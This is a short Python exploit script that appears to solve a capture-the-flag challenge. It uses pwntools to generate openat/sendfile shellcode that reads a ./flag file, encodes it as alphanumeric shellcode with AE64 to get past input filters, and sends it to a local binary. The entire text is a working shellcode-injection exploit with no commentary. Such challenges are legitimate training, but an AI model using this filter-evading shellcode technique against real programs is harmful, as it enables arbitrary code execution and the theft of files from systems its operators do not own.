from pwn import *
from ae64 import AE64

p = process("./attachment")
context(os="linux", arch='amd64', log_level='debug')

p.recvuntil("\n")
shellcode = shellcraft.openat('AT_FDCWD', './flag', 0, 0)
shellcode += shellcraft.sendfile(1, 3, 0, 50)
alphanumeric_shellcode = AE64().encode(asm(shellcode), 'rdx', 0, 'fast')
p.send(alphanumeric_shellcode)

p.interactive()
